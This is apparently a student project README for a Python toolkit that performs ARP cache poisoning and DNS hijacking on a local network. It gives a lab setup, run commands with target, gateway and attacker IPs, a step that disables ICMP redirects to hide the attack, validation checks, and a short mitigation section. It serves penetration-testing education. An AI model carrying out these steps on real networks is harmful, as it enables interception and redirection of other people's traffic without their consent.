# ☠️ MITM Tactical Suite (ARP & DNS Spoofing)

![Python](https://img.shields.io/badge/Python-3.x-blue.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)
![Platform](https://img.shields.io/badge/Platform-Linux-lightgrey.svg)

**MITM Tactical Suite** is an advanced, modular toolkit designed for executing Man-in-the-Middle (MITM) simulations. It combines Layer 2 routing manipulation (ARP Cache Poisoning) with Layer 7 payload interception (DNS Hijacking). 

This suite is explicitly built to help cybersecurity professionals, penetration testers, and network administrators evaluate local network resilience against redirection attacks.

> **⚠️ Disclaimer:** This toolset was created for **Educational Purposes and Proof of Concept (PoC) only**. Do not execute these scripts on any network where you do not have explicit, written permission. The author is not responsible for any misuse, damage, or legal consequences caused by this program.

## 🌟 Features

* **Modular Architecture:** Clean separation between ARP and DNS logic within the `core/` directory.
* **Automated OS Configuration:** Automatically handles Linux kernel IP forwarding and disables ICMP redirects for stealth.
* **DNSQR Interception:** Fixed high-speed interception using Scapy's `DNSQR` for accurate domain hijacking.
* **Safe Auto-Restoration:** Automatically heals the victim's ARP table upon termination (CTRL+C).

## 🗂️ Project Structure
```
MITM-Tactical-Suite/
├── core/
│   ├── arp_module.py      # Layer 2 Poisoning Logic
│   └── dns_module.py      # Layer 7 Hijacking Logic
├── utils/
│   ├── logger.py          # Terminal Output Formatting
│   └── network_ops.py     # MAC Discovery & Network Tools
├── mitm_suite.py          # Main Orchestrator (Runner)
└── requirements.txt       # Dependencies
 ```
## ⚙️ Prerequisites & Environment Setup

This tool requires **Linux** (Kali Linux recommended) and a target machine (e.g., Ubuntu).

1. Networking (Virtual Machine)

To avoid IP conflicts, DO NOT use NAT. Use Host-Only Adapter or Bridged Adapter:
* **Ensure both VMs are on the same subnet `(e.g., 192.168.18.x)`.
* **Enable Promiscuous Mode: Allow All in VirtualBox Network Settings.

2. Target Fix (If using Ubuntu Focal/Jammy)
If you encounter bad interpreter errors on the target due to missing Python links:

   ```bash
    sudo ln -sf /usr/bin/python3.8 /usr/bin/python3
    sudo apt install net-tools -y
   ```
3. Installation

   ```bash
   git clone https://github.com/HaykalAzriel/MITM-Tactical-Suite.git
   cd MITM-Tactical-Suite
   pip install -r requirements.txt
   ```

## 🚀 Usage: Kill Chain Simulation

Step 1: Stealth Mode (Attacker Machine) 
Prevent the target from receiving ICMP Redirect warnings that could expose the attack:
   ```bash
echo 0 | sudo tee /proc/sys/net/ipv4/conf/all/send_redirects
   ```
Step 2: Execute the Attack
Run the suite with the following parameters. Ensure you use  `sudo` for socket access:
   ```bash
export PYTHONPATH=$PYTHONPATH:.
sudo python3 mitm_suite.py -t <TARGET_IP> -g <GATEWAY_IP> -d <DOMAIN> -r <ATTACKER_IP>
   ```
   
Verified Lab Example:
   ```bash
# Attacker (Kali): 192.168.18.192
# Target (Ubuntu): 192.168.18.190
# Gateway: 192.168.18.1

sudo python3 mitm_suite.py -t 192.168.18.190 -g 192.168.18.1 -d google.com -r 192.168.18.192
   ```

## 🧪 Validation

1. ARP Check (Target): Run `arp -n`. The Gateway IP should now show the Attacker's MAC address (`08:00:27:9e:22:d7`).
2. DNS Check (Target): Run `ping google.com`. The terminal on the Attacker's side will log:
`[+] Mencegat DNS untuk 'google.com.' -> Diarahkan ke 192.168.18.192`


## 🛡️ Mitigation

To protect networks from this suite, administrators should implement:
* **Dynamic ARP Inspection (DAI)** and DHCP Snooping on enterprise switches.
* **DNSSEC (Domain Name System Security Extensions)** to validate DNS responses cryptographically.
* **Force HTTPS/HSTS to protect against traffic sniffing.

---
*Developed by **Haykal Azriel Priatama** as part of Telkom University.*
